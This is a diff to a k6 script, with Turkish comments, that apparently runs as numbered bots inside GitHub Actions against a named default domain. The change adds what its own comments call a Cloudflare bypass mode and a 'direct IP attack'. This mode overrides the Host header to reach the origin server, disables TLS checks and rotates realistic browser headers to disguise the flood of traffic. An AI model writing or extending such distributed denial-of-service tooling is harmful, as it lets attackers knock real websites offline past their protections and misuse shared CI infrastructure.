@@ -1,6 +1,8 @@
 // ================================================================
 // k6 script — GitHub Actions runner içinde çalışan senaryo
-// ENV: TARGET_URL, DURATION, VUS, RPS, BOT_ID
+// ENV: TARGET_URL, DURATION, VUS, RPS, BOT_ID, HOST_HEADER
+//
+// HOST_HEADER varsa: Cloudflare bypass modu (direkt IP saldırısı)
 // ================================================================
 
 import http from 'k6/http';
@@ -9,13 +11,13 @@ import { Counter, Trend, Rate } from 'k6/metrics';
 
 const TARGET_URL = __ENV.TARGET_URL || 'https://hhh.frostai.com.tr';
 const BOT_ID = __ENV.BOT_ID || '0';
+const HOST_HEADER = __ENV.HOST_HEADER || '';  // Cloudflare bypass için
 
 // Özel metrikler
 const bytesReceived = new Counter('bytes_received_total');
 const successRate = new Rate('success_rate');
 const responseTime = new Trend('response_time_ms', true);
 
-// Realistic User-Agent list
 const USER_AGENTS = [
     'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
     'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
@@ -28,7 +30,7 @@ const USER_AGENTS = [
 const ACCEPT_LANGUAGES = ['tr-TR,tr;q=0.9,en;q=0.8', 'en-US,en;q=0.9', 'tr,en-US;q=0.9,en;q=0.8'];
 
 function randomHeaders() {
-    return {
+    const headers = {
         'User-Agent': USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)],
         'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
         'Accept-Language': ACCEPT_LANGUAGES[Math.floor(Math.random() * ACCEPT_LANGUAGES.length)],
@@ -41,17 +43,27 @@ function randomHeaders() {
         'Cache-Control': 'no-cache',
         'Pragma': 'no-cache'
     };
+
+    // Cloudflare bypass: Host header override
+    if (HOST_HEADER) {
+        headers['Host'] = HOST_HEADER;
+    }
+
+    return headers;
 }
 
-// k6 options — VU, duration, rps CLI'den geliyor
 export const options = {
     discardResponseBodies: false,
     batch: 20,
-    batchPerHost: 20
+    batchPerHost: 20,
+    insecureSkipTLSVerify: true  // Origin IP HTTPS SSL bypass
 };
 
 export function setup() {
-    console.log('BOT #' + BOT_ID + ' baslatildi - Hedef: ' + TARGET_URL);
+    console.log('BOT #' + BOT_ID + ' - Hedef: ' + TARGET_URL);
+    if (HOST_HEADER) {
+        console.log('BOT #' + BOT_ID + ' - CLOUDFLARE BYPASS MODU - Host: ' + HOST_HEADER);
+    }
 }
 
 export default function () {
